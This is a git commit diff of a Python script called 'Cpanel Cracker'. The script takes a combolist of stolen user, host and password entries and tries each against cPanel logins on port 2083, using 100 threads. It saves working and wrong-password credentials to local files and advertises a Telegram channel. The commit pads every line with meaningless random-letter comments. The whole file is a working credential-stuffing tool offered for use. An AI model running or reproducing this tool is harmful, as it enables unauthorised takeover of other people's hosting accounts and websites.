03b6b6291509265212793000ac893ebab410d4f3
Blackhat Egypt <87125760+simosaper@users.noreply.github.com>
2023-10-22 06:06:12 +0300

    Update start.py

--- start.py
+++ start.py
@@ -1,112 +1,221 @@
 #Coder: @simosaper11
+#lkyxbltiremvxwryneiaozvcccqdbivlvoxnwuvxpcodvlypvdbwaieefxhdfuzuaznygyossufukxvgceyyvjnehsmsqykeggfm
 #channel: @simosaper
+#xkxknaspawaigkfhankhaibyieygpembprrynmxogdigprchgrtnfohvlsdpqwfwmpwjubgobannlgksokfukkeolatxhvyrpivb
 #FREE TOOL !!!
+#xitdcdyqpgdgyzbejggzdhgxeymspeuijeqvqnxhvboyctrxlpjenwjbqtahfbqlyixlmzijsxrtzjsoemqdjczzhaxbsartfgmq
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#mpwtilqlibljkveclbhhajjygiwvgvppowcmmcbeebovzdzhqycitmayfdbfiwxevwboazegnkklcxgjzfdryfyqcibviuubnjsz
  
+#dfnhorslvluemzkzusqdgeifqgvgjaslfgkqfobyvwxnswzkfqqwxvgkdpflwydsnqyktorqatqqvmamewhtpuxwawivhueyssyc
 import requests, os,random,ctypes,colored
+#twukvikcezpcpsvnhmnvqrdxlmzkhcjplrbtxrjsbmlsotvkwlpqgzzmtdlnzgqcyzxzeokdjikxxostjwiraxzbudpibiuvpali
 import colorama
+#qbcnkmraqrtcgcqhqmxkqojpdbdubeqrhsgesassfybshyobwqohoqbewzovzeqlbqkfrqhlodgqeacbaybxzauufikezasdrmrl
 from colorama import Fore
+#eywmifqoxbmwacovmrpcrpssdjxhjjqczzqanjahwcyedqtmdbmbnorhdgrhxsdevjbezzdalhgpxscfyjtcrqmfxwjsrupbekyd
 from colorama import Fore as F, Style
+#icughstpfhjrlfrnzdlwykuccrqlxslswwyspmuffholszkcrlestpminsfenvhrqhroeqjkjlavxbbdlfokroumdnfijpzwwbph
 from concurrent.futures import ThreadPoolExecutor
+#bsymgdfbzwrzduynbjtdlcpgdhkxlfwqxtngsrnxjoqvvuvuwlvvyfvnuryvrgdyihukdgzrkzaqlcbboourfvqmcgtszltflhhu
 #Coder: @simosaper11
+#zydtlzsibwonglfjyqycspbvtfqorrmtkxcuzgoukgynamwyclhtfisoxmowjgewmohbyvefumlizhkzbesgoojdnyddywmaygqd
 #channel: @simosaper
+#cdwffwjjcjidqgcrgxkitubsscyhpdtvmthwoqqrjxayfdvllngvfsomzlufjxfqftojitwrexpqlppkvddwnnqqwlzlcxndxmmn
 #FREE TOOL !!!
+#agezmpbgvxlguiygnvlspgwjcxxdjtqqvtvlongkksepjmxkswfojheewolpzcnabwxxsxgmayywwgndiwqinyjwcfkrhulvdqxb
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#ldoehixjevzsmxwqfxvkkgkmjzjvvfbbluzcsbwosmvvbtgeyblpnbrtnzxvuvpiewhhojuuyvzranmketayyvglkbbidehzgsum
  
+#djdufkokyhymdjjuqpxolijmkxeqtrqwcenerytbgiwvbrrkihofutjgvvaadbdoscdkvpwwuifwtlsqzunktfhpwlmdsfrztdpk
 yellow = F.LIGHTYELLOW_EX
+#owancszogxzfvwzzmmquawckdyamczppajvmhloityerbqfncxjfgrhzifbxsmuojfllieqmeloiimdwkotsvumoywvvmqggvcsj
 red = F.LIGHTRED_EX
+#mkssjuhcjfcvpmjlsxmoxakujxcazmtbuvqhdyfabmuyvtbhxppyjqiszekodptghkrhvwprizpxsxasjtyilgwlcmrwnptgghio
 green = F.LIGHTGREEN_EX
+#cpieeimlqcrygxqrofaapyvrfiyjppqkpajrrijbibocgudyvlmjzbhyfiebsgdskohukydzutaggwadfyxseiopidgktbgvdunl
 cyan = F.LIGHTCYAN_EX
+#aemrytovkhgsefmxkhzimqowpazpmqfmgvzevdoanoawqmajjabbgbbugjnykzlxdydpcuwbfymdsjklwzqmvmajaaolhwovqrfs
 blue = F.LIGHTBLUE_EX
+#xaunujwdiezoiyfwyrgmmkjzuwenvfknyspmcsrccdspkehxswyiivjlsdcihwbttujkvduzcomjqxtkjqiuhwjsqkwunoolzhpj
 sb = Style.BRIGHT
+#nbozflblkrqgijxrfhchltyjgurxomvxzojiwjoujctzwkbgerkjmuobhogjbzbwnamapetgkbzhsrtnkzadeupmfqhhtpnbictk
 #Coder: @simosaper11
+#bdnlqsegydjiearfzdyniexknqbnkpgfhdqfedtwchokservwzkjsuwjofpdxksurnqxotgrlphvgoxbhutryeacmumlcrvpfyqm
 #channel: @simosaper
+#spapncilayyozoqmzyehdnevmromlkclwholvpmdrsrxblqopztbxruriicbuusblxzrolwytzrblprvswwsijevzzdwxiqhpvda
 #FREE TOOL !!!
+#xnfdpjsxaaaivjfzukxrytcwebcjqiaibksebfkrghosiefdbaxrpkafilszeldtiipvlowtlznswmscokbtszjywtqfpanezoen
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#wzntauupdelvarpasogfqitxbikeligdfkgbuclkqflaqsizoffuonplbveybxddnfgbbzyllgguyrsawzvvyyjssbrnutulrpxb
  
+#pjwjcygjvrcyixxwsuynqhwigqiucauojtfqnpbjgzhsojobzaqyrnikvwqbrqwwwjuycotekuklombcenogmhzhcaarqrsurkxa
 if not os.path.exists('@simosaper11'):
+#kevfgbidxytemileplrakzpcyblfbgdxrxuuvtbrfasjxgdgqfflrekrsucuxqbdoeqbzhxnrjmfeljshtuygkjdozbkhshvfkud
     os.mkdir('@simosaper11')
+#vddahjvmlysddlbvklraidtdvgctdwioccdmftosfpzfcriuavichychivdmmacwzqsfrzczqzohofgshdnlanralcmhmcuodwzx
 
+#pmfgafhfhfbiqrrasxtmtzprurxyiepblgmxlrwaehptmwyifqxjntqfkvgqngqpjqziecvrcbrozfznyshcztwxkzevdznkswcu
 colorama.init()
+#pstyefwlwxouuagituvxcyxbvztatyzluzhcfobnytrjcasdxdoqdbuojrysectajvoztzhylbpaweqrudusfaymbfmalqaupasp
 
+#xmbzwqgvokbqrixalpmqqvnrccsxgdlhffcrltjukfelwkfcyaydrrbvrmixyvazzynihyieqxzplyakikhomqndrbnsgejptuaj
 head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
+#gstamtewlkgwlkdgmvyawsvufipdwgpjmmbzpiojuhlfhbzdzvgmgiayocobukystdaeeyjaeqlnmrejmjxihchbubjxtexztjbd
 TOTAL = 0
+#xrycbkkuswuvudiftaazoeygnxwmazrezatnedgehjwjtortadxzmccqvqcttopzxykedqncdpsbvdrxhjjfieofkksjlpqozwoi
 WORK = 0
+#wurpayczcyqcqedmnhzcfbwtfzwaflhcqzvivpctsalkeymwvzigcnwstjbgnbczhandwifqoeiibqaobbbcmckjosxmrkkmobww
 WRONG = 0
+#mwjdpldxozrxodtqdqikcdwsalyvyispkgpplfmuipvrmbrhhcexaqjwkddxqdmkgmjsrkxrtwndmflvyddpkzceblunpmapyzee
 BAD = 0
+#wsiukemtnopvwnavhbwgyxqrxgageeoxkwaqwrujtkqipzoeyiebgnmpuhsacfeohfofstuwmrgsaruqfzlbjxrbbinbjksvofzv
 
+#lnbrqgexburmtgnjegzykgwjwyeiifwtjwshlmgvnxwitczpyyrwgdjeympfhcbscwxdndrexdvvjvhvhcdnotqemdgwklonbpru
 #Coder: @simosaper11
+#snmenocxnxwwwcsmoubdluwsetluxejgppuezxpypidqnfyldqfceycpofwtyyofgffgsjtaefgrchqcvdmgyflzbmkxzejxwjiw
 #channel: @simosaper
+#ermzkspfulobszpusgpmbkdoaolnndgliodyzkzzdiwtcmyhygxhlbzehyzxabmufwralojztnzywgmzprnibutjyppisovsgsdi
 #FREE TOOL !!!
+#jbnicestamaxpkynnhlgryowdmmimpsforninltsbosopsgtnwwoavnmdwlotejofdumqowgcswxmypmhyxwwdmlrnwtyoyxjcfq
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#pxbajgcrwuhjsxtezpjosfsuoxzuovqqiqqwllrojfisrjlkumueqwrvmzbhdfvjfadsbdttqeuvctinocnzcircnvkzadbuylod
  
+#hsakwjivgsdyhyjvyuiyjvxxqhgkihidopujdymhfbvvojsozpjjmxdhpthwguedvogzzdwpuwnkdbdrzeerdozcyodwjpcmyhee
 def checker(line):
+#dcwfopiltwvqfojawzepicrikefuzuiujljrggwlpdfltogfxlnbcpxfsczgxpxbbwzkbfzuodqypnpsvbpbhqbprgnprmmkcktx
     global TOTAL
+#qynzdbwqfpxyydoeeekzmisemmkypekjiudqqipohvtfetltmukqofncdgutdzvqkwrwsznaqmmfaasqntigcehhfetviejqdwtj
     global WORK
+#obcsgzudxfpityyvqxvxrjntrqcufdtqwosgshduhoqqkvhdqjnrluxsxyhhvppcredsbgpxdkobtefzfuqwgmdvffmgoubouwkm
     global WRONG
+#jungycazkbahqaziyrsdcsbbpwfrxposvhpqprbgdkmwfndltfdhvlxuvawhrwvpbagvzrzudyexdkflncwoxpplkyqzlklhjxhe
     global BAD
+#rlbckynesirdefwbikoqkvgbfrblkhvcnoiqccasouuakbwfwugztzirsmauckyipkdnulsshmksuyqxcmupfldpzjcvruejwqfj
        
+#udvptnstvnkatqrxdqjkocpnqhdycbqgomopxnnoomcrajncgypcqwcihzzovhmlmbthqtpspfwmogctubsgmhndxeainmlnwyub
     spl = line.split('@')
+#sylstuebmhtruatpbtnfgvegnlxjjfqnlalbombgqkusrtgqedwrrvsylllycjqjcckdokpggqbsgforliuhkfzojnmrcfoqxgls
     user = spl[0]
+#dqpmskyfkojrxtvbasttfhhyrboexgvqahkraxoeejekokpikfyaflvgimptfjuknhwzagrhmieiyzbvxomvtbmdgkrebityfwes
     url = spl[1].split(':')[0]
+#rrmkvtfyfzlkabunpcxgrilnxgftvydwemmtfntqkiahnevvixguwoeodwwyozgxxoaabahmysjyejtqmgvdtyoujyzjiunnxsch
     miniurl = url+':2083'
+#bmskbbkkguppdlvkzucssmbhkzgfejbvmkhnikfyopptcvlecnomcdjolryiqmutosjjkcbpxijxwvrgeobujwpwhwcpthseyqbh
     url = 'https://'+url + ':2083/login/?login_only=1'
+#bjqgixmkfezycpmkoriznlphfoujldhdibhrwhfxgdvxoplggndzrnnldtcjxcoyqxjiftuqcobigujzcwgabmtriwfxqrxnbjda
     passw = line.split(':')[1]
+#zvydgwlvprazbmaeggghrhoyhwvhxapqsjltgzkayopdbpjjeojwnuyskqapdkypbhwgskcnnelnwunhpwzfqcrlainzblaxejzx
 
+#bdxjhsvpewikhouljqrvuwyulvcdxiymbfjvwujmqsnxugdzylvohotkapejytrzdiyhiofkvqxlwdqfiaewmbifqprzgdphwvlv
 
+#nivrkfqxwvdrufzmhrjsmvdyvejsfltqnxjviplbbfswnhxgntnxmrgbzaozoosughrsirgvgvkimoeyuxwxqcacclbwhfvnmzap
     
+#qghiucsnmqpxxtnswxkbgtrxgmtrdygzeadaxitthpgfbnopsmphrdkdsmatottktjhaoyelsgsduhqzyjofuogrjwwyxwokzvfb
     data = f'user={user}&pass={passw}&goto_uri=%2F'
+#ieewpqbdoqqgtqyukeakvoqieoagzsliyvvaezblwnfyvpilqkstjaakzwttgjylpuvdtnhmwlhwtomcobblaxgqwgeaqkfvvikd
     try:
+#mwswslyahbzszbkscjiqsoaifctimwqvszbwruekdcclmucmvmnkxgryznjngkmpufhieiidqmynrhnythyvzkmhqzvsfohhfccq
         r = requests.post(url,headers=head,data=data,allow_redirects=False).text
+#azcwdvjpqxqxojjjnkmoepkdbcycrazmnbwdpcjeykvmgrvutydrquwdquivfodccdlneiugkgdaxpiuwvkeqbsuysfrodeutffh
 
+#kestubcxhhcqtliipisobypwchnatkmvuvdiwommypcxyuigyludvvrbhmccbnzexqufedvcjtysiaoouyktnqcxeoobfayvptsu
         result = f'URL: {miniurl}\nUSER: {user}\nPASS: {passw}\n[>] Checked By @simosaper11\n\n'
+#byrxdxvwprihoddswultmayypxrmhxzdsssjvhhmhhnurbrrqkpyzmmohjlmhefipewlpxmucpfkwvhsvzoxdxgxroapsasioapc
 
+#tqwngnwzgvtvttuwkceorrmbbuidmsiuxoczehvebczhgaryslgaxfruezepaijbzydvfradtdbicsqvkmouarzonpbrhqtmqjep
         if '{"notices":[]' in r or 'security_token":"' in r:
+#knxlttibmnzcddizjqbmrahnogccftbyobhhxqgpqyacayoazxmwtcgzzpsuygjicmfxdqisayblmcarxthuxbakpikazhehuehm
             print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX} VALID CPANEL ')
+#nxdvlrgwnxziakapcrygwkndbnayncjdwiyuvansbkvegvdhzwpzozlagqhjscqjialdgmkiwuqikzahzmhgrhpielosfygfgiht
             WORK +=1
+#glzpugvfphjjpusbghuknslmjlvijrigxvhjumgalkicdpdwljbbnlphtmgcjqowabifvenudvcizekforuvsvphudmrwwoexnus
             TOTAL +=1
+#pvvfrhztodwqmzlgorchrliebgaojpfaltfnutymjjoajgojccwvqbcczsiscpbjkptpecbkyucbdbvjhiqtxxglisajdhecukyf
 #Coder: @simosaper11
+#umakkujwekcdpaxurefilcdzeapwtrndtigbgkyauciljbkdsdibgcukdjlgrewwddjxlmalmswdmklmvjuszvksaljddkbsxeij
 #channel: @simosaper
+#jrjhfyfphuysedyksqmokndhequurwmxtzlzzsxxsrmonpxhfzpvpflcuyhiwdjcuqhghjdtlvqgsdfenyjsayqxaxbfcnydgdrp
 #FREE TOOL !!!
+#hlkyphxfboitijgnsztlevoffkjudeonqonkhaqrcrodscvzmgowvybshndbywavxdqxfymbcjscebvzkhblkpdqwxyrwswbpdox
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#qddumyoastboyppruzmewyymjozopdeuehxatfbbcozfjjlxxypvjfhmdiziwfxtlicvfcyqgznlzvjpobadjkqzjwbeewgoiqha
  
+#jojimosqaowscnihiujowqhquatklmkxtkiiuopahkauwsyawuuywlqsnyfvpfzymvnxsbwbobyihwzvqzzazzmntpeasvibvoma
             save = open('@simosaper11/Work Cpanels.txt','a')
+#citwzabzvgqaygetqsnnznlyyhkkqsyghulncutaxynjugofnynrhchgikqzmvjdngucokztzpslvutypwjkzyhgbesihaywnnmg
             save.write(result)
+#otaknimuwirhpnqcdylqnoblgdhfluibppzflskfzdwedmysajzcwsvjewudfpduxbybcqrfkcgyzxamcdemqnnnaewbnydmkdyz
             save.close()
+#jufukpfdkefdjxlonypkabcamcmeykkprwgcbnljxlcmkptqajtxotzrtsmpwmtpqzeymqumbopxyxlwdmkgvdcfggacedfgoyvm
         if 'invalid_login' in r:
+#ahmkdqbdrzuuwzhejcoemhxbarukrsppmchlxhshxdgnfhyhyortyyijvsyyaheakmukjaikmsgosjmupufrxodgnyvbmmihcxby
             print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX}FOUND CPANEL BUT WRONG PASSWORD")
+#lmzqjhklwlwjobpqeevzpmmvfbyrjlgjghzbyvczhpfpkyjwqkjzmisogoptwyvvvdukiblhqlozqcyiyptwreqcixmxbhplbvsu
             WRONG +=1
+#tyfvizmbwnjoqccbnfhdtcpeaszoxqkqwumxolhsenwcelfhuaqdmqciibophnmekhnmcfxxlvwgafbsafbwicciywefedqywqck
             TOTAL +=1
+#ljywkcatueubpqrmbyhhpxxmnqfidohgaxjwpigvuokenzqpbtpskopbqjrwycuwnesuxtviwfpcovszaozqnvrcmtxjzcjpavvl
             save = open('@simosaper11/Cpanels WrongPassword.txt','a')
+#ayyoptghghbafznipcivadxdfhqecpzwdekejbvmnctrkzokarohceunorwyvttcywrpbgstdmujjvjosqbwwhfzyugtnrmoufbn
             save.write(result)
+#fdusfkqyyhpsneycwkyyyfzvdxehtriyoldpkguhoyyhhmavltyngxfwrbaowmgrrzbmvkpwscoezbmihpzdiehduqurazbbeasr
             save.close()
+#rdldtrnacumjdzqpyometieeqajopuswssxhkxwzqsydfcjonudzhfnizuxkklozwqwnyfkwvimycsrekfpulshafrmnzaosxoxo
     except:
+#prnssmmnplddlqqninfiiozwxvjeaujdoeordqzeqorsebaozmqlpxlhiewkrdiczfmcxwrfdslrezmufawsuqfdvywvnelvcxrs
         print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}<{Fore.LIGHTCYAN_EX}]{Fore.LIGHTRED_EX}[BAD]{Fore.LIGHTWHITE_EX} {miniurl}')
+#phjgqbxmbwcgyxchqpkptpkrzazyjhddryfosjryvomqzhtpantgwfygphqbnpyfjrfdyhwjgwlopmcobsbgrsakagbwmbgfjqth
         BAD +=1
+#csbcyzdmxnbrmpjcsfgczyixyflbdzxxnfulzkgguaapnzhedbpxnvjhtvngnigknnfpiofcyjlryhkpxikwhyrnsecrlmzfgzif
         TOTAL +=1
+#mpintgerdgzhhavnsbonnmnrjedlyiivdjmamifdeuueekxrgvftcoizrkhzxwvsenjutuexhuzqfvpnmfbhvwnmkgtkbqzzrwne
     ctypes.windll.kernel32.SetConsoleTitleW(f'Cpanel Cracker join now : [https://t.me/simosaper | Checked {TOTAL}\\{num} \\ WORK {WORK} \\ WrongPASS {WRONG} \\ BAD {BAD}')
+#bvicoqljvqserpiiuccdbftgufuwtkqqdxmxsboicgvvnmfsvsftyxfpqyxcuhqzamaixirdviudvgvacllgjfmpvrbyqhwxuxqf
 #Coder: @simosaper11
+#bnpwirjpfbwqbrjeymhmfjetsvorqgauljsgckxzwatibtkdqabrgjcamqkpqkasngfuewlzuodqjsuyzkkldxqhzaucmmixyqky
 #channel: @simosaper
+#myyyaylxrrbliszlwxbsbbczqshssxswlqnwtblofpehdtcxcbhvogtqeotlcmsrlgqpwkkeiqclcggrzocmmoctenyqokkaatpz
 #FREE TOOL !!!
+#tlxvgbrbkfwbrfzwklzlcgxnhkcvbwjqhowdenyuadkhqkssogxjocawwygaezgckudnmnzdrpygmpuvcwotxjuqfaozntoruktd
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#vtdejobzqyisnymgzxmhghmnusijwdvhjdwqunglonnkeiaxqfcflzcypuisqzhtmkggfpjqllozyxgtuytfmtuvyvvdtatyaxie
  
+#nmbzgztntbldaaetoxgjpvkkqurumtezdrdistqkaxpprnlvynzizhkkcsugafuyoszfrbetkqnrswgxfepsjzwlhbkfvzbxcade
 
+#bpigdadygbufqjllseeiwywvaefzrmtchfuxwrbjgtbnjkkpjzrtakvxoskbuyqfesfcyeajmafxkkyqchyfwfxrmsrajwxvkkii
 def main():
+#ggcjffkxrecwkqzneseblezhmfzsmhobrsxcxbtigswvvygadlxcnrienlvhspsqthhhbxgusdnbjjmunhcrudkbecehzdlmugmi
     global num
+#jrimesttnbbnyvtsrcgscoqanwtbqleirlzafsnscvvrliryfxsvgimbprygynhmxntpgnufqrdfuxfpzyngmsyuaxmqjpewttda
     if os.name == 'nt':
+#qoqiyhgvtanhvfpnufgihmpignyetodkqirkknnjpjqmzjrxdfklxhgvpnllspxopcnjydzihzykbxoctccmeanxhryqobvhlorm
         os.system('cls')
+#pebykkwjjjxmiiibxrzagfhwbwazdumqnqhrtybkbaljjgthwsqcqfojobbhmrhmhmclqtdpfinqvdvwqdymwhugbrvtrrxwelgm
     else:os.system('clear')
+#ovshqvcmcpmpfrbzboeeadyewoxvbkthkaqkyrayugscemhurotusddifeczkiejpkyrlcifkckmqbugjeedgkwxblxpgognuzoh
     os.system('mode con:cols=130 lines=30')
+#gbsoxyzmihegxxjbrxugveaambfsclxauspuxahwmxbitxveprdqdxobovchlzuvgzqapqhuuijaztilagdafoivffirzarqyncy
     ctypes.windll.kernel32.SetConsoleTitleW('Cpanel Cracker : Coder @simosaper11')
+#ebmqaynluzzaemumxmtuuwqbptiynduvcxtfcioazydxtazxzhgcsbsdwtezrvabjgbqxkhyzksrkqfvsgbfonttiecaeqetfcut
     
+#fozkwxwbghecpyguvdijzlbavikajajdjybteidikikosxarxpwlslbmkgbusnrjhxownzrcxwzsitncnndidtcasmhxwzlhkzdm
     
+#dinvquerxgkaqamrxsfxcihnzhlphbjfcmuzqieayzehbwltgbixqlindrcmifrxsqxtpnhsexuokepekbcmdkwjzxmijviwradj
 #Coder: @simosaper11
+#zdhcrhvfmfyvjsirkueolygggekkiyjsjkpgogmficjuxzrxvdncijtxozkbwgbunnobjsojhencjctsfhakagxbwmcpyefiimby
 #channel: @simosaper
+#byyrylwvaobfqhvrxjnsdzrogtfinqeagdhhdzhlxywblglzpystzvyqikwgttpwmxhrizldqofizalgdxxluzgsvvqyrstqjczq
 #FREE TOOL !!!
+#sgapbfmexbpvqoznbjtzksstfhgrvdypidihxalggoovrrhpweogwzcgvaejvyfosfndxxyygbgnxrhyhhcgtdbsywkfeswvbylj
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#pymqykirtevpvxmlyvsmzxuqtmrgcunmkgwlowgkpamutnfslcxonmsidnxetaylzpqgtjkotrvfzvgmdycnqkrpowiqxqkqnqfi
      
+#hizycvlukfqfsgbnjxkjrpkpwknhopjggaxzyfomsplnsdoxwqigluusmsyglcuwpzsrdnispfvnurjnepwzahefrmaiwclgtynf
     
+#foimoembfkrahlkerudosgfhpfouyrjbxtotmlwhqyrkqhaojbrdftguhwlwztpxuebhtrgslqchdhgnhslmaorjvjtvjdwhrekm
 
+#yeirtjqwgxcaxnkppndopathfioryftwwqnirtuyhdwlcftkulukpytccdnjzpthczfwfhnddzcdqiyekqnjugzhveqjjylhoylf
     print(f"""{F.LIGHTCYAN_EX}
          _
    _____(_)___ ___  ____  _________ _____  ___  _____
@@ -117,21 +226,39 @@ def main():
                                                  {F.LIGHTYELLOW_EX} [ CPANEL CRACKER ]
                                                  {F.LIGHTYELLOW_EX}[  FREE VERSION :0 ]
                                          {F.LIGHTYELLOW_EX}TELEGRAM FOR MORE TOOLS:{F.LIGHTWHITE_EX} https://t.me/simosaper
-    """)
-    lista = input('Enter Combolist: ')
-    if os.name == 'nt':
-        os.system('cls')
-    else:os.system('clear')
-    with open(lista,'r') as f:
-        lines = f.read().splitlines()
 
+    """)
+#tyqfubifmikjygifyqsfxemwgbsuxyqlrndohckurxfuohesxwpfpagwkurozvloiihvkwnurnxvdnopcsbyeczcktfyloahdjdm
+    lista = input('Enter Combolist: ')
+#puqlupbldvmgmzrtziuckdsnyffhtaqhlvdgxjtcjyepowoisebxsfijvrriqhcaugzrsrztezgsnejtkidysimdebrsunotdzxz
+    if os.name == 'nt':
+#jedxckrihpnenjynuipkijkyoravaydjgqymoenfhracxhohealwxjzgfimqqkpaocaqzzknvncofbsxntfobvphxminqzuuvtws
+        os.system('cls')
+#vngzxnudztbcotudrtwudkjnbrjdspdpqqdzjbozcjfnjjhethhldfrrzybgenpfepqyylhldmpkmdiwmojeihcswjyqwecpiery
+    else:os.system('clear')
+#pqytelbujpmgwzyznkhxopwyitmmlkjdvyughgikcmemqjudntbtgxopqcfdfmeomyuvggjcjkgjmcyontfyegzafidvozqoljiu
+    with open(lista,'r') as f:
+#zoefznefgzvulxopkfiiwxvbqpkuulsttgihpzzrgtgqsoqstvgxwytvcikabyimokwevwkefelnpetagtygwzqxpllqluhfvrfl
+        lines = f.read().splitlines()
+#esziifhhsfzdocujfhfrgzlzaydzukhpifotklmmeeesxrnpcqglzkbfbyffefyvhuejidzlubzeewsecqqandeuzbwheceietye
+
+#pedqfswlfnyrifukaudkyedepapsuhdphdwdlwuuxnwdjogoflvsujqnwkrugswefbieaunuqfaqukuiqgpdzzyjoecnolbnbvdm
 #Coder: @simosaper11
+#nsvzquuarheofofmmikiqpqeqbjutbbgemwqegsbachqudlyfhevcmuxfvahxdrlfxogwizrovywlemyizdfqsaqqngxaxcpchlf
 #channel: @simosaper
+#fbpdvmxtyuzfdigakblaujaowxyhblvjkwkurdtczxhcavskeshpomxuggmjslijgwdrapxmdjnqttepfusctjmhbrhfkrdqplqb
 #FREE TOOL !!!
+#qxszslmpvgzlzkhfrbabgzioasnfvejltlxpshnhqwcvrwcswxwmbbstfexyyktrdicgmeqmdrxmjziubmdfhllgmfoorewplftd
 #note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+#eupprwcethqhpomzjaqmzulduzgbzoqakmegtvesifxuwbgvassamllprbafbmitpiqvwkgnqzmtivlysyncwqisgozcxuffpavv
  
+#nykzitkfzwrxjpstepuyyjxalmzzcwkwqtpkdfbxmduptrrrlyjldbniiyhstyypdtvukwztkdojulbfxyidlxbctrnpfsgpimym
         
+#uxzsmdjmbqvwidxkiysbfisjyleqtbstwqniulmttkpztquriwvdayxjermcdraqvgpphkwlakzglkuxnogbzfitverjclzprepw
         num = len(lines)
+#hgpljvibrwyjmvmvspazrvbmberfvvntenvxekxrpntqjudvyhmxivqbnnbtlseqiupqeunkvpuxcmhvqkblpafadzfzqqwdedus
     with ThreadPoolExecutor(max_workers=100) as p:
+#vdqvnjpveqdxkauanqxisduptgugtxbhfwcdoedfkasvcsfcryjcuesyzdwjzyjgzxkitniqcnhygqwszzhxvgqtetaogtrmjzyi
         p.map(checker,lines)
-main()
+#avzkavfurqkwbueiuxoauokyhposizrxsyxtiuokziluhqkogjwwbcflajasmedwbbdpievvkgkfenlnaukscrumfchthclbihac
+main()#uwhxziynjmddbwbgvyhrzjbrcxgoupgyfnrsmcnanvmwsljelquqerqcfatwwxfhusjinxksxvyioyafenhjaeobhpiervrilren
